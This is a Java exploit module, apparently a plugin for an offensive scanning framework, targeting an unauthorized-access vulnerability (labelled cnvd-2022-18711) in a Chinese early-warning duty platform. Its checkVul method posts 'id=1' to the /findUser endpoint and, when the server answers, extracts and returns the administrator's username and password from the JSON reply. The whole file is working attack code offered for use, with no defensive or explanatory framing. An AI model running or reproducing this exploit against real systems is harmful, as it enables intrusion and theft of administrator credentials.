package fun.fireline.exp;
import com.alibaba.fastjson.JSONObject;
import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;

import java.util.HashMap;

/**
 * 2022/11/24
 * 预警值守平台未授权漏洞
 */

public class finduser implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    private static final String VULURL = "/findUser";
    private static final String PAYLOAD = "id=1";

    @Override
    public String checkVul(String url) {
        this.target = url;

        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(this.target + VULURL, PAYLOAD, this.headers, "UTF-8");

        if (response.getText() != null && response.getText().contains("name")) {
            this.isVul = true;
            String result = response.getText();
            String res1 = null;
            String res2 = null;
            JSONObject object = JSONObject.parseObject(result);
            res1 = object.getString("name");
            res2 = object.getString("password");
            return "[+] 目标存在cnvd-2022-18711漏洞" + "\n" + "管理员用户名：\n" + res1 +"\n" +"管理员密码：\n" + res2 ;
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }


    @Override
    public String exeCmd(String cmd, String encoding) {
        return null;
    }

    @Override
    public String getWebPath() {
        return this.target + VULURL;
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        return null;
    }

    @Override
    public boolean isVul() {
        return false;
    }
}
